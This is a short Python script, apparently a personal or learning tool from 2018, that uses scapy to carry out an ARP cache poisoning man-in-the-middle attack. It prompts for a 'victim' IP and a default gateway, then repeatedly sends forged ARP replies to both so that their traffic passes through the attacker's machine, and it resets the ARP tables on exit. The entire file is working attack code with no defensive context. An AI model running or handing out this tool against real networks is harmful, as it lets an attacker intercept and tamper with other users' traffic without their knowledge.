#!/usr/bin/env python

"""
run following commands if having issues with scapy:
-> pip uninstall scapy-python3
-> apt-get update
-> apt-get upgrade
-> apt-get install python3-pip
-> pip3 install scapy-python3
-----> 'python3 arp_mim.py' should now work.
v1.0 Aug 2018
johnroge -> outlook.com
Last change: documentation update
"""
import scapy.all as scapy
import time
import sys


def print_header():
    print('*' * 60)
    print('*' * 60)
    print('    Replace a target IP and DG with your own MAC address')
    print('                   CTRL+C to exit')
    print('*' * 60)
    print('*' * 60)
    print()
    print()


def get_mac(ip):
    """
    Use the ARP broadcast to get the MAC address from a given IP
    :param ip: target IP address
    :return: MAC address of target IP
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(victim_ip, spoof_ip):
    target_mac = get_mac(victim_ip)
    """
    For a given IP, poison the ARP cache with a new MAC address
    op=1 is ARP request, op=2 is ARP response
    pdst = destination IP / target IP
    hwdst = target MAC address
    """
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    """
    Restore all MAC addresses on program exit.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def main():
    """
    Logical flow: 1) get victim IP and gateway IP from user
                  2) use 'get_mac' to find MAC addresses of each IP
                  3) run spoof against both IPs to poison their ARP cache
                  4) reverse the ARP cache poison using restore when a
                        keyboard interrupt signal is detected
    """

    print_header()

    target_ip = input('Victim IP (e.g. 10.0.0.5): ')
    gateway_ip = input('Default Gateway (e.g. 10.0.0.1): ')

    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Packets sent: " + str(sent_packets_count)),
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Resetting ARP tables...\n")
        restore(target_ip, gateway_ip)


if __name__ == '__main__':
    main()
